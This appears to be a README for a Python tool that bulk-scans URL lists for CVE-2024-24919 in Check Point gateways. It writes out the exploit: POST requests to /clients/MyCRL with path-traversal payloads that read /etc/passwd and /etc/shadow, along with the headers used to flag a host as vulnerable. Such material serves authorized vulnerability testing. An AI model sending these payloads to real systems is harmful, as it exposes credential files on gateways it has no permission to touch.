# CVE-2024-24919 Bulk Scanner
CVE-2024-24919 [Check Point Security Gateway Information Disclosure]

Script based on and the credit goes to: https://labs.watchtowr.com/check-point-wrong-check-point-cve-2024-24919/

This Python script scans lisy of URLs for CVE-2024-24919 vulnerability by sending specific POST requests and checking the response headers and status code. It logs the request and response details and identifies vulnerable URLs based on predefined criteria.

![image](https://github.com/ifconfig-me/CVE-2024-24919-Bulk-Scanner/assets/25315805/464caa97-c007-4da8-b6d5-f277b684123b)


> [!WARNING]
> Intended only for educational and testing in corporate environments.
> https://twitter.com/nav1n0x/ https://github.com/ifconfig-me takes no responsibility for the code, use at your own risk.
> Do not attack a target you don't have permission to engage with.

## Features
> [!NOTE]
**Threading**: The new v2 version now able to work on threading. The script creates 50 threads to process URLs concurrently for faster scanning and this threading can be contolled by `-t` 100.
**Queue**: A queue is used to manage URLs and distribute them to worker threads.
**Progress and Results**: The script prints progress and results using colored output.

- Sends POST requests with payloads to specified URLs.
- Checks the response headers and status line to determine vulnerabilities.
- Logs full request and response details.
- Outputs progress and results in the terminal.
- Saves vulnerable URLs to a file.
- Supports sequential scanning to ensure reliable request handling.

## Requirements

- Python 3.x
- `requests` library
- `termcolor` library

## Installation

1. **Clone the repository:**

    ```bash
    git clone https://github.com/ifconfig-me/CVE-2024-24919-Bulk-Scanner.git
    cd CVE-2024-24919-Bulk-Scanner
    ```

2. **Install the required libraries:**

    ```bash
    pip install requests termcolor
    ```

## Usage

1. **Prepare a file with the list of URLs:**

    Create a text file (e.g., `urls.txt`) with one URL per line. Make sure each URL starts with `https://`. Example:

    ```
    https://example.com
    https://testsite.com
    https://vulnerable.com
    https://123.456.789.10:8080
    ```

2. **Run the script:**

    ```bash
    python CVE-2024-24919-auto-v2.py -t 150 -f urls.txt
    ```

3. **Check the output:**

    The script will print the scanning progress and results in the terminal. Vulnerable URLs will be identified with the message `Vulnerable URL found:`.

4. **Results:**

    - **Progress and results** will be displayed in the terminal.
    - **Request and response logs** will be saved in `request-analyze.txt`and `request-analyze-v2.txt` in n2 version
    - **Vulnerable URLs** will be saved in `checkpoint-results.txt` and `checkpoint-results-v2.txt` in v2 version. 

## Script Details

- The script sends POST requests to the `/clients/MyCRL` endpoint of each URL with two payloads:
  - `aCSHELL/../../../../../../../etc/passwd`
  - `aCSHELL/../../../../../../../etc/shadow`

- It checks the response headers for the following criteria:
  - `Server: Check Point SVN foundation`
  - `X-UA-Compatible: IE=EmulateIE7`
  - `X-Frame-Options: SAMEORIGIN`
  - Status line: `HTTP/1.0 200 OK`

- If the response matches either of the three of the above criteria, the URL is considered vulnerable.

## Example Output

![image](https://github.com/ifconfig-me/CVE-2024-24919-Bulk-Scanner/assets/25315805/c5ba361a-e702-4e14-9ba9-99618ad0ba64)






